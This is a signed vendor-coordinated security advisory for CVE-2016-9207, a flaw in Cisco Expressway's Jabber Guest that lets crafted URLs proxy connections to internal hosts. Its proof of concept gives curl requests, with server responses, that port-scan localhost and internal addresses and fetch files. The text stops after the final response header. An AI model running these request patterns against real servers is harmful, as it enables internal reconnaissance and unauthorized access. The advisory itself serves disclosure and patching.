Subject: [SYSS-2016-115] Cisco Expressway: Security Bypass Vulnerability
 (CWE-20)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Advisory ID: SYSS-2016-115
Product: Expressway
Manufacturer: Cisco
Affected Version(s): below X8.9
Tested Version(s): X8.8.1
Vulnerability Type: Improper Input Validation (CWE-20)
Risk Level: Medium
Solution Status: Fixed
Manufacturer Notification: 2016-11-10
Solution Date: 2016-12-05
Public Disclosure: 2016-12-14
CVE Reference: CVE-2016-9207
Author of Advisory: Micha Borrmann, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

Jabber Guest [1] can be used to connect people from the Internet with
enterprise workers using video calls within a web browser.

Due to improper input validation, it is possible by using specially
crafted URLs to perform port scans from the used video communication
server (VCS) [2] of any system which can be reached by it, usually
internal servers. It is also possible to perform denial-of-service
attacks against the VCS by downloading large files.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

A part of the URL is a host name (usually the internal Jabber Guest
server) which will be connected from the EXP-C [3] which acts like a
web proxy, if /jabberc/rest/calls/ is appended to the first "directory".
With a colon (:), it is also possible to specify a target TCP port.
Therefore, anybody, for example an external attacker, can abuse the web-based 
application to connect to target systems. If the system is a web
server, it also possible to download files from it. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

This HTTP GET requests connects to the SSH server on localhost:

$ curl --include https://jabberguest.company.com/127.0.0.1:22/jabberc/rest/calls/index.txt
HTTP/1.1 200 Connection Established
Server: nginx/1.6.2
Date: Fri, 11 Nov 2016 12:14:20 GMT
Transfer-Encoding: chunked
Connection: keep-alive
Age: 0

SSH-2.0-OpenSSH_6.6 PKIX
Protocol mismatch.

It can be confirmed, that no SMTP service is running on localhost (very simple port scan):

$ curl --include https://jabberguest.company.com/127.0.0.1:25/jabberc/rest/calls/index.txt
HTTP/1.1 502 Connection refused
Server: nginx/1.6.2
Date: Fri, 11 Nov 2016 12:22:30 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 253
Connection: keep-alive
Cache-Control: no-store
Content-Language: en
Age: 0

<HTML>
<HEAD>
<TITLE>Could Not Connect</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">

<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: Could not connect to the server "<EM>127.0.0.1</EM>".
</B></FONT>

</BODY>

Connections to other servers are possible, too:

$ curl --include https://jabberguest.company.com/172.27.14.74:22/jabberc/rest/calls/index.txt
HTTP/1.1 200 Connection Established
Server: nginx/1.6.2
Date: Fri, 11 Nov 2016 12:13:00 GMT
Transfer-Encoding: chunked
Connection: keep-alive
Age: 0

SSH-2.0-OpenSSH_6.2_hpn13v11 FreeBSD-20130515
Protocol mismatch.

If a web server contains files within the directory structure
/jabberc/rest/calls/, they can be downloaded via the Jabber Guest via
EXP-E via EXP-C. For demonstration purposes, there was a simple text
file placed at such directory (on a Microsoft Server system which can
also be identified):

$ curl --include https://jabberguest.company.com/172.27.14.12/jabberc/rest/calls/index.txt 
HTTP/1.1 200 OK
